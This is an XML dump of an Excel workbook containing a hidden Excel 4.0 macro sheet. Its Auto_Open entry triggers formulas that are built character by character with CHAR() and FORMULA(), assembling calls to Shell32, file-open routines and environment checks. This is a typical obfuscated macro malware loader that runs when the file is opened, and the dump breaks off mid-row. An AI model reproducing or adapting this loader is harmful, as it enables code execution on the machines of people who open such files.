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macrosheets/sheet1.xml" ContentType="application/vnd.ms-excel.macro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filterPrivacy="1"/>
  <bookViews>
    <workbookView xWindow="32760" yWindow="32760" windowWidth="28800" windowHeight="12225" activeTab="1"/>
  </bookViews>
  <sheets>
    <sheet name="Sheet1" sheetId="1" r:id="rId1"/>
    <sheet name="1294mTTcvy" sheetId="2" r:id="rId2"/>
  </sheets>
  <definedNames>
    <definedName name="_xlnm.Auto_Open">'1294mTTcvy'!$Q$1</definedName>
  </definedNames>
  <calcPr calcId="191029"/>
</workbook>
</file>

<file path=xl/sharedStrings.xml><?xml version="1.0" encoding="utf-8"?>
<sst xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main" count="229" uniqueCount="4">
  <si>
    <t>NjqDI3RfaLnZhLT6BxpF</t>
  </si>
  <si>
    <t>bKAHWJzDDRatcZzHUpIl</t>
  </si>
  <si>
    <t>a1c0HdyTE3zCrlHJ60dd</t>
  </si>
  <si>
    <t>Z0k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</si>
</sst>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0"/>
      <name val="Calibri"/>
      <family val="2"/>
      <scheme val="minor"/>
    </font>
    <font>
      <sz val="11"/>
      <color theme="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 diagonalUp="1" diagonalDown="1"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 style="thin">
        <color indexed="9"/>
      </diagonal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3" fillId="0" borderId="1" xfId="0" applyFont="1" applyBorder="1"/>
    <xf numFmtId="0" fontId="3" fillId="0" borderId="0" xfId="0" applyFon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microsoft.com/office/2006/relationships/xlMacrosheet" Target="macrosheets/sheet1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16</xdr:col>
      <xdr:colOff>304800</xdr:colOff>
      <xdr:row>29</xdr:row>
      <xdr:rowOff>47625</xdr:rowOff>
    </xdr:to>
    <xdr:pic>
      <xdr:nvPicPr>
        <xdr:cNvPr id="1027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0058400" cy="5572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macro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216"/>
  <sheetViews>
    <sheetView showFormulas="1" tabSelected="1" workbookViewId="0">
      <selection activeCell="Q21" sqref="Q21"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr defaultColWidth="4.85546875" defaultRowHeight="15" x14ac:dyDescent="0.25"/>
  <cols>
    <col min="1" max="3" width="4.85546875" style="1"/>
    <col min="9" max="11" width="4.85546875" style="1"/>
    <col min="12" max="12" width="5" style="1" customWidth="1"/>
    <col min="14" max="14" width="6" style="1" customWidth="1"/>
    <col min="15" max="15" width="5.5703125" style="1" customWidth="1"/>
    <col min="16" max="16" width="4.85546875" style="1"/>
    <col min="17" max="17" width="16.7109375" style="1" customWidth="1"/>
    <col min="18" max="18" width="8" style="1" customWidth="1"/>
    <col min="19" max="113" width="4.85546875" style="1"/>
    <col min="114" max="114" width="7.140625" style="1" customWidth="1"/>
    <col min="115" max="16384" width="4.85546875" style="1"/>
  </cols>
  <sheetData>
    <row r="1" spans="1:17" x14ac:dyDescent="0.25">
      <c r="D1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="E1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="F1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="I1" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="M1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="O1" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="Q1" t="b">
        <f>FORMULA(A13&amp;A14&amp;A16&amp;A17&amp;A19&amp;A20&amp;A21&amp;A22&amp;A23&amp;A24&amp;A25&amp;A27&amp;A28&amp;A30&amp;A31&amp;A32&amp;A33&amp;A34&amp;A36&amp;A37&amp;A38&amp;A39&amp;A40&amp;A42&amp;A43&amp;A44&amp;A46&amp;A47&amp;A48&amp;A49&amp;A51&amp;A52&amp;A53&amp;A55&amp;A56,R1)</f>
        <v>1</v>
      </c>
    </row>
    <row r="2" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A2" s="1"/>
      <c r="B2" s="1"/>
      <c r="C2" s="1"/>
      <c r="D2" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="F2" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="I2" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="J2" s="1"/>
      <c r="K2" s="1"/>
      <c r="L2" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="M2" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="N2" s="1"/>
      <c r="O2" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="P2" s="1"/>
      <c r="Q2" t="b">
        <f>FORMULA(B4&amp;B5&amp;B7&amp;B8&amp;B10&amp;B11&amp;B12&amp;B13&amp;B14&amp;B15&amp;B16&amp;B18&amp;B19&amp;B21&amp;B22&amp;B23&amp;B24&amp;B25&amp;B27&amp;B28&amp;B29&amp;B30&amp;B31&amp;B33&amp;B34&amp;B35&amp;B37&amp;B38&amp;B39&amp;B40&amp;B42&amp;B43&amp;B44&amp;B46&amp;B47,R2)</f>
        <v>1</v>
      </c>
    </row>
    <row r="3" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A3" s="1"/>
      <c r="B3" s="1"/>
      <c r="C3" s="1"/>
      <c r="D3" t="s">
        <v>3</v>
      </c>
      <c r="F3" t="s">
        <v>3</v>
      </c>
      <c r="I3" t="s">
        <v>3</v>
      </c>
      <c r="J3" s="1"/>
      <c r="K3" s="1"/>
      <c r="L3" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="M3" t="s">
        <v>3</v>
      </c>
      <c r="N3" s="1"/>
      <c r="O3" t="s">
        <v>3</v>
      </c>
      <c r="P3" s="1"/>
    </row>
    <row r="4" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A4" s="1"/>
      <c r="B4" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="C4" s="1"/>
      <c r="D4" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="F4" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="I4" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="J4" s="1"/>
      <c r="K4" s="1"/>
      <c r="L4" t="s">
        <v>3</v>
      </c>
      <c r="M4" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="N4" s="1"/>
      <c r="O4" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="P4" s="1"/>
      <c r="Q4" t="b">
        <f>FORMULA(C28&amp;C29&amp;C31&amp;C32&amp;C34&amp;C35&amp;C36&amp;C37&amp;C38&amp;C39&amp;C40&amp;C42&amp;C43&amp;C45&amp;C46&amp;C47&amp;C48&amp;C49&amp;C51&amp;C52&amp;C53&amp;C54&amp;C55&amp;C57&amp;C58&amp;C59&amp;C61&amp;C62&amp;C63&amp;C64&amp;C66&amp;C67&amp;C68&amp;C70&amp;C71&amp;C72&amp;C73&amp;C75&amp;C76&amp;C77&amp;C78&amp;C80&amp;C81&amp;C82&amp;C84&amp;C85&amp;C86&amp;C87&amp;C89&amp;C90&amp;C91&amp;C92&amp;C94&amp;C95&amp;C96&amp;C97&amp;C99&amp;C100&amp;C101&amp;C102&amp;C103&amp;C104&amp;C106,R4)</f>
        <v>1</v>
      </c>
    </row>
    <row r="5" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A5" s="1"/>
      <c r="B5" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="C5" s="1"/>
      <c r="D5" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="F5" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="I5" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="J5" s="1"/>
      <c r="K5" s="1"/>
      <c r="L5" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="M5" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="N5" s="1"/>
      <c r="O5" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="P5" s="1"/>
      <c r="Q5" t="b">
        <f>FORMULA(D1&amp;D2&amp;D4&amp;D5&amp;D7&amp;D8&amp;D9&amp;D10&amp;D11&amp;D12&amp;D13&amp;D15&amp;D16&amp;D18&amp;D19&amp;D20&amp;D21&amp;D22&amp;D24&amp;D25&amp;D26&amp;D27&amp;D28&amp;D30&amp;D31&amp;D32&amp;D34&amp;D35&amp;D36&amp;D37&amp;D39&amp;D40&amp;D41&amp;D43&amp;D44&amp;D45&amp;D46&amp;D48&amp;D49&amp;D50&amp;D51&amp;D53&amp;D54&amp;D55&amp;D57&amp;D58&amp;D59&amp;D60&amp;D62&amp;D63&amp;D64&amp;D65&amp;D67&amp;D68&amp;D69&amp;D70&amp;D72&amp;D73&amp;D74&amp;D75&amp;D76&amp;D77&amp;D79&amp;D80&amp;D81&amp;D82&amp;D83&amp;D84&amp;D86&amp;D87&amp;D88&amp;D89&amp;D90&amp;D91&amp;D93&amp;D94&amp;D95&amp;D96&amp;D97&amp;D98&amp;D100&amp;D101&amp;D102&amp;D103&amp;D104&amp;D106&amp;D107&amp;D108&amp;D109&amp;D110&amp;D112&amp;D113&amp;D114&amp;D115&amp;D117&amp;D118&amp;D119&amp;D120&amp;D121&amp;D122&amp;D124&amp;D125&amp;D127&amp;D128&amp;D129&amp;D130&amp;D132&amp;D133&amp;D134&amp;D135&amp;D136&amp;D138&amp;D139&amp;D140&amp;D141&amp;D142&amp;D143&amp;D145&amp;D146&amp;D147&amp;D148&amp;D149&amp;D151&amp;D152&amp;D153&amp;D154&amp;D156&amp;D157&amp;D158&amp;D159&amp;D160&amp;D162&amp;D163&amp;D164&amp;D165&amp;D166&amp;D167&amp;D168&amp;D169&amp;D170&amp;D171&amp;D172&amp;D173&amp;D174&amp;D175&amp;D176&amp;D177&amp;D178&amp;D179&amp;D180&amp;D181&amp;D182&amp;D183&amp;D184&amp;D185&amp;D186&amp;D187&amp;D188&amp;D189&amp;D190&amp;D191&amp;D192&amp;D193&amp;D194&amp;D195&amp;D196&amp;D197&amp;D198&amp;D199&amp;D200&amp;D201&amp;D202&amp;D203&amp;D204&amp;D205&amp;D206&amp;D207&amp;D208&amp;D209&amp;D210&amp;D211&amp;D212&amp;D213&amp;D214&amp;D215&amp;D216,R5)</f>
        <v>1</v>
      </c>
    </row>
    <row r="6" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A6" s="1"/>
      <c r="B6" t="s">
        <v>3</v>
      </c>
      <c r="C6" s="1"/>
      <c r="D6" t="s">
        <v>3</v>
      </c>
      <c r="F6" t="s">
        <v>3</v>
      </c>
      <c r="I6" t="s">
        <v>3</v>
      </c>
      <c r="J6" s="1"/>
      <c r="K6" s="1"/>
      <c r="L6" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="M6" t="s">
        <v>3</v>
      </c>
      <c r="N6" s="1"/>
      <c r="O6" t="s">
        <v>3</v>
      </c>
      <c r="P6" s="1"/>
    </row>
    <row r="7" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A7" s="1"/>
      <c r="B7" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="C7" s="1"/>
      <c r="D7" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="F7" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="G7" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="I7" s="1" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="J7" s="1"/>
      <c r="K7" s="1"/>
      <c r="L7" t="s">
        <v>3</v>
      </c>
      <c r="M7" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="N7" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="O7" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="P7" s="1"/>
      <c r="Q7" t="b">
        <f>FORMULA(E1&amp;E11&amp;E13&amp;E14&amp;E16&amp;E17&amp;E18&amp;E19&amp;E20&amp;E21&amp;E22&amp;E24&amp;E25&amp;E27&amp;E28&amp;E29&amp;E30&amp;E31&amp;E33&amp;E34&amp;E35&amp;E36&amp;E37,R7)</f>
        <v>1</v>
      </c>
    </row>
    <row r="8" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A8" s="1"/>
      <c r="B8" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="C8" s="1"/>
      <c r="D8" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="F8" t="str">
        <f>CHAR(78)</f>
        <v>N</v>
      </c>
      <c r="G8" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="I8" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="J8" s="1"/>
      <c r="K8" s="1"/>
      <c r="L8" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="M8" t="str">
        <f>CHAR(91)</f>
        <v>[</v>
      </c>
      <c r="N8" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="O8" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="P8" s="1"/>
      <c r="Q8" t="b">
        <f>FORMULA(F1&amp;F2&amp;F4&amp;F5&amp;F7&amp;F8&amp;F9&amp;F10&amp;F11&amp;F12&amp;F13&amp;F15&amp;F16&amp;F18&amp;F19&amp;F20&amp;F21&amp;F22&amp;F24&amp;F25&amp;F26&amp;F27&amp;F28&amp;F30&amp;F31&amp;F32&amp;F34&amp;F35&amp;F36&amp;F37&amp;F39,R8)</f>
        <v>1</v>
      </c>
    </row>
    <row r="9" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A9" s="1"/>
      <c r="B9" t="s">
        <v>3</v>
      </c>
      <c r="C9" s="1"/>
      <c r="D9" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="F9" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="G9" t="s">
        <v>3</v>
      </c>
      <c r="I9" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="J9" s="1"/>
      <c r="K9" s="1"/>
      <c r="L9" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="M9" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="N9" t="s">
        <v>3</v>
      </c>
      <c r="O9" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="P9" s="1"/>
      <c r="Q9" t="b">
        <f>FORMULA(G7&amp;G8&amp;G10&amp;G11&amp;G13&amp;G14&amp;G15&amp;G16&amp;G17&amp;G18&amp;G19&amp;G21&amp;G22&amp;G24&amp;G25&amp;G26&amp;G27&amp;G28,R9)</f>
        <v>1</v>
      </c>
    </row>
    <row r="10" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A10" s="1"/>
      <c r="B10" t="str">
        <f>CHAR(71)</f>
        <v>G</v>
      </c>
      <c r="C10" s="1"/>
      <c r="D10" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="F10" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="G10" t="str">
        <f>CHAR(80)</f>
        <v>P</v>
      </c>
      <c r="I10" s="1" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="J10" s="1"/>
      <c r="K10" s="1"/>
      <c r="L10" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="M10" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="N10" t="str">
        <f>CHAR(76)</f>
        <v>L</v>
      </c>
      <c r="O10" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="P10" s="1"/>
      <c r="Q10" t="b">
        <f>FORMULA(H33&amp;H34&amp;H36&amp;H37&amp;H39&amp;H40&amp;H41&amp;H42&amp;H43&amp;H44&amp;H45&amp;H47&amp;H48&amp;H50&amp;H51&amp;H52&amp;H53&amp;H54&amp;H56,R10)</f>
        <v>1</v>
      </c>
    </row>
    <row r="11" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A11" s="1"/>
      <c r="B11" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="C11" s="1"/>
      <c r="D11" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="E11" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="F11" t="str">
        <f>CHAR(99)</f>
        <v>c</v>
      </c>
      <c r="G11" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="I11" s="1" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="J11" s="1"/>
      <c r="K11" s="1"/>
      <c r="L11" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="M11" t="str">
        <f>CHAR(93)</f>
        <v>]</v>
      </c>
      <c r="N11" t="str">
        <f>CHAR(69)</f>
        <v>E</v>
      </c>
      <c r="O11" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="P11" s="1"/>
      <c r="Q11" t="b">
        <f>FORMULA(I1&amp;I2&amp;I4&amp;I5&amp;I7&amp;I8&amp;I9&amp;I10&amp;I11&amp;I12&amp;I13&amp;I15&amp;I16&amp;I18&amp;I19,R11)</f>
        <v>1</v>
      </c>
    </row>
    <row r="12" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A12" s="1"/>
      <c r="B12" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="C12" s="1"/>
      <c r="D12" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="E12" t="s">
        <v>3</v>
      </c>
      <c r="F12" t="str">
        <f>CHAR(58)</f>
        <v>:</v>
      </c>
      <c r="G12" t="s">
        <v>3</v>
      </c>
      <c r="I12" t="str">
        <f>CHAR(91)</f>
        <v>[</v>
      </c>
      <c r="J12" s="1"/>
      <c r="K12" s="1"/>
      <c r="L12" t="str">
        <f>CHAR(114)</f>
        <v>r</v>
      </c>
      <c r="M12" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="N12" t="s">
        <v>3</v>
      </c>
      <c r="O12" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="P12" s="1"/>
      <c r="Q12" t="b">
        <f>FORMULA(J15&amp;J16&amp;J18&amp;J19&amp;J21&amp;J22&amp;J23&amp;J24&amp;J25&amp;J26&amp;J27&amp;J29&amp;J30&amp;J32&amp;J33&amp;J34&amp;J35&amp;J36&amp;J38&amp;J39&amp;J40&amp;J41&amp;J42&amp;J44&amp;J45&amp;J46&amp;J48&amp;J49&amp;J50&amp;J51&amp;J53&amp;J54&amp;J55&amp;J57&amp;J58&amp;J59&amp;J60,R12)</f>
        <v>1</v>
      </c>
    </row>
    <row r="13" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A13" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="B13" t="str">
        <f>CHAR(46)</f>
        <v>.</v>
      </c>
      <c r="C13" s="1"/>
      <c r="D13" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="E13" t="str">
        <f>CHAR(65)</f>
        <v>A</v>
      </c>
      <c r="F13" t="str">
        <f>CHAR(92)</f>
        <v>\</v>
      </c>
      <c r="G13" t="str">
        <f>CHAR(83)</f>
        <v>S</v>
      </c>
      <c r="I13" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="J13" s="1"/>
      <c r="K13" s="1"/>
      <c r="L13" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="M13" t="str">
        <f>CHAR(60)</f>
        <v>&lt;</v>
      </c>
      <c r="N13" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="O13" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="P13" s="1"/>
      <c r="Q13" t="b">
        <f>FORMULA(K21&amp;K22&amp;K24&amp;K25&amp;K27&amp;K28&amp;K29&amp;K30&amp;K31&amp;K32&amp;K33&amp;K35&amp;K36&amp;K38&amp;K39&amp;K40&amp;K41&amp;K42&amp;K44&amp;K45&amp;K46&amp;K47&amp;K48&amp;K50&amp;K51&amp;K52&amp;K54&amp;K55&amp;K56&amp;K57&amp;K59&amp;K60&amp;K61&amp;K63&amp;K64&amp;K65&amp;K66&amp;K68&amp;K69&amp;K70&amp;K71&amp;K73&amp;K74&amp;K75&amp;K77&amp;K78&amp;K79&amp;K80&amp;K82&amp;K83,R13)</f>
        <v>1</v>
      </c>
    </row>
    <row r="14" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A14" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="B14" t="str">
        <f>CHAR(87)</f>
        <v>W</v>
      </c>
      <c r="C14" s="1"/>
      <c r="D14" t="s">
        <v>3</v>
      </c>
      <c r="E14" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="F14" t="s">
        <v>3</v>
      </c>
      <c r="G14" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="I14" t="s">
        <v>3</v>
      </c>
      <c r="J14" s="1"/>
      <c r="K14" s="1"/>
      <c r="L14" t="str">
        <f>CHAR(109)</f>
        <v>m</v>
      </c>
      <c r="M14" t="s">
        <v>3</v>
      </c>
      <c r="N14" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="O14" t="s">
        <v>3</v>
      </c>
      <c r="P14" s="1"/>
    </row>
    <row r="15" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A15" t="s">
        <v>3</v>
      </c>
      <c r="B15" t="str">
        <f>CHAR(79)</f>
        <v>O</v>
      </c>
      <c r="C15" s="1"/>
      <c r="D15" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="E15" t="s">
        <v>3</v>
      </c>
      <c r="F15" t="str">
        <f>CHAR(117)</f>
        <v>u</v>
      </c>
      <c r="G15" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="I15" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="J15" s="1" t="str">
        <f>CHAR(61)</f>
        <v>=</v>
      </c>
      <c r="K15" s="1"/>
      <c r="L15" t="s">
        <v>3</v>
      </c>
      <c r="M15" t="str">
        <f>CHAR(48)</f>
        <v>0</v>
      </c>
      <c r="N15" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="O15" t="str">
        <f>CHAR(108)</f>
        <v>l</v>
      </c>
      <c r="P15" s="1"/>
      <c r="Q15" t="b">
        <f>FORMULA(L2&amp;L3&amp;L5&amp;L6&amp;L8&amp;L9&amp;L10&amp;L11&amp;L12&amp;L13&amp;L14&amp;L16&amp;L17&amp;L19&amp;L20&amp;L21&amp;L22&amp;L23&amp;L25&amp;L26&amp;L27&amp;L28&amp;L29&amp;L31&amp;L32&amp;L33&amp;L35&amp;L36&amp;L37&amp;L38&amp;L40&amp;L41&amp;L42&amp;L44&amp;L45&amp;L46&amp;L47&amp;L49&amp;L50&amp;L51&amp;L52&amp;L54&amp;L55&amp;L56&amp;L58&amp;L59&amp;L60&amp;L61&amp;L63&amp;L64&amp;L65&amp;L66&amp;L68&amp;L69&amp;L70&amp;L71&amp;L73&amp;L74&amp;L75&amp;L76&amp;L77&amp;L78&amp;L80&amp;L81&amp;L82&amp;L83&amp;L84&amp;L85&amp;L87&amp;L88&amp;L89&amp;L90&amp;L91&amp;L92&amp;L94&amp;L95&amp;L96&amp;L97&amp;L98&amp;L99&amp;L101&amp;L102&amp;L103&amp;L104&amp;L105&amp;L107&amp;L108&amp;L109&amp;L110&amp;L111&amp;L113&amp;L114&amp;L115&amp;L116&amp;L118&amp;L119&amp;L120&amp;L121&amp;L122&amp;L123&amp;L125&amp;L126&amp;L128&amp;L129&amp;L130&amp;L131&amp;L133&amp;L134&amp;L135&amp;L136&amp;L137&amp;L139&amp;L140&amp;L141&amp;L142&amp;L143,R15)</f>
        <v>1</v>
      </c>
    </row>
    <row r="16" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A16" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="B16" t="str">
        <f>CHAR(82)</f>
        <v>R</v>
      </c>
      <c r="C16" s="1"/>
      <c r="D16" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="E16" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="F16" t="str">
        <f>CHAR(115)</f>
        <v>s</v>
      </c>
      <c r="G16" t="str">
        <f>CHAR(91)</f>
        <v>[</v>
      </c>
      <c r="I16" t="str">
        <f>CHAR(93)</f>
        <v>]</v>
      </c>
      <c r="J16" t="str">
        <f>CHAR(70)</f>
        <v>F</v>
      </c>
      <c r="K16" s="1"/>
      <c r="L16" t="str">
        <f>CHAR(111)</f>
        <v>o</v>
      </c>
      <c r="M16" t="str">
        <f>CHAR(44)</f>
        <v>,</v>
      </c>
      <c r="N16" t="str">
        <f>CHAR(34)</f>
        <v>"</v>
      </c>
      <c r="O16" t="str">
        <f>CHAR(51)</f>
        <v>3</v>
      </c>
      <c r="P16" s="1"/>
      <c r="Q16" s="1" t="b">
        <f>FORMULA(M1&amp;M2&amp;M4&amp;M5&amp;M7&amp;M8&amp;M9&amp;M10&amp;M11&amp;M12&amp;M13&amp;M15&amp;M16&amp;M18&amp;M19&amp;M20&amp;M21&amp;M22&amp;M24&amp;M25&amp;M26&amp;M27&amp;M28&amp;M30&amp;M31&amp;M32&amp;M34&amp;M35&amp;M36&amp;M37&amp;M39&amp;M40&amp;M41&amp;M43&amp;M44&amp;M45&amp;M46&amp;M48&amp;M49&amp;M50&amp;M51&amp;M53&amp;M54&amp;M55&amp;M57&amp;M58&amp;M59&amp;M60&amp;M62&amp;M63&amp;M64&amp;M65&amp;M67&amp;M68&amp;M69&amp;M70&amp;M72&amp;M73&amp;M74&amp;M75&amp;M76&amp;M77&amp;M79&amp;M80&amp;M81&amp;M82&amp;M83&amp;M84&amp;M86&amp;M87&amp;M88&amp;M89&amp;M90&amp;M91&amp;M93&amp;M94&amp;M95&amp;M96&amp;M97&amp;M98&amp;M100&amp;M101&amp;M102&amp;M103&amp;M104&amp;M106&amp;M107&amp;M108&amp;M109&amp;M110&amp;M112&amp;M113&amp;M114&amp;M115&amp;M117&amp;M118&amp;M119&amp;M120&amp;M121&amp;M122&amp;M124&amp;M125&amp;M127&amp;M128&amp;M129&amp;M130&amp;M132&amp;M133&amp;M134&amp;M135&amp;M136&amp;M138&amp;M139&amp;M140&amp;M141&amp;M142&amp;M143&amp;M145&amp;M146&amp;M147&amp;M148&amp;M149&amp;M151&amp;M152&amp;M153&amp;M154&amp;M156&amp;M157&amp;M158&amp;M159,R16)</f>
        <v>1</v>
      </c>
    </row>
    <row r="17" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A17" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="B17" t="s">
        <v>3</v>
      </c>
      <c r="C17" s="1"/>
      <c r="D17" t="s">
        <v>3</v>
      </c>
      <c r="E17" t="str">
        <f>CHAR(40)</f>
        <v>(</v>
      </c>
      <c r="F17" t="s">
        <v>3</v>
      </c>
      <c r="G17" t="str">
        <f>CHAR(45)</f>
        <v>-</v>
      </c>
      <c r="I17" t="s">
        <v>3</v>
      </c>
      <c r="J17" t="s">
        <v>3</v>
      </c>
      <c r="K17" s="1"/>
      <c r="L17" t="str">
        <f>CHAR(110)</f>
        <v>n</v>
      </c>
      <c r="M17" t="s">
        <v>3</v>
      </c>
      <c r="N17" t="str">
        <f>CHAR(84)</f>
        <v>T</v>
      </c>
      <c r="O17" t="s">
        <v>3</v>
      </c>
      <c r="Q17" s="1"/>
    </row>
    <row r="18" spans="1:17" customFormat="1" x14ac:dyDescent="0.25">
      <c r="A18" t="s">
        <v>3</v>
      </c>
      <c r="B18" t="str">
        <f>CHAR(75)</f>
        <v>K</v>
      </c>
      <c r="C18" s="1"/>
      <c r="D18" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="E18" t="str">
        <f>CHAR(78)</f>
        <v>N</v>
      </c>
      <c r="F18" t="str">
        <f>CHAR(101)</f>
        <v>e</v>
      </c>
      <c r="G18" t="str">
        <f>CHAR(49)</f>
        <v>1</v>
      </c>
      <c r="I18" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="J18" t="str">
        <f>CHAR(73)</f>
        <v>I</v>
      </c>
      <c r="K18" s="1"/>
      <c r="L18" t="s">
        <v>3</v>
      </c>
      <c r="M18" t="str">
        <f>CHAR(67)</f>
        <v>C</v>
      </c>
      <c r="N18" t="str">
        <f>CHAR(104)</f>
        <v>h</v>
      </c>
      <c r="O18" t="str">
        <f>CHAR(50)</f>
        <v>2</v>
      </c>
      <c r="Q18" t="b">
